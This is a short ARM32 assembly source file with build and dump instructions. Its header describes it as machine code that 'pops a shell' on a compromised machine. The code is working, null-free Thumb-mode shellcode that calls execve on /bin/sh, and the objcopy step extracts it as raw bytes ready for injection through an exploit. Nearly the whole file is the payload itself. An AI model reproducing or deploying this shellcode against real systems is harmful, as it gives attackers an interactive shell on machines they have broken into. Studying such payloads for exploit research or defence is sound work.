/*

Author: Abhinav Thakur
File:   execve_binsh.s

PoE:
	This machine code when executed on a compromised machine, simply pops a shell.

Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static execve_binsh.s -o ./execve_binsh.elf
OR
Assemble and Link:
	$ arm-linux-gnueabi-as ./execve_binsh.s -o ./execve_binsh.o && arm-linux-gnueabi-ld -N ./execve_binsh.o -o ./execve_binsh.elf

Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=execve_binsh.raw ./execve_binsh.elf
Run            :
	$ ./execve_binsh.elf

~~ SYSCALL conventions for ARM32
move parameters into => r0, r1, r2, r3, r4, r5
move syscall number  => r7
find return value in => r0


*/

.global _start
_start:

	.code 32
	add r3, pc, #1
	bx r3
	
	.code 16
	// execve("/bin/sh", 0, 0);
	add r0, pc, #8
	mov r7, #11
	eor r2, r2, r2
	eor r1, r1, r1
	strb r2, [r0, #7]
	svc #1

shellPath:
.ascii "/bin/shX"
.align
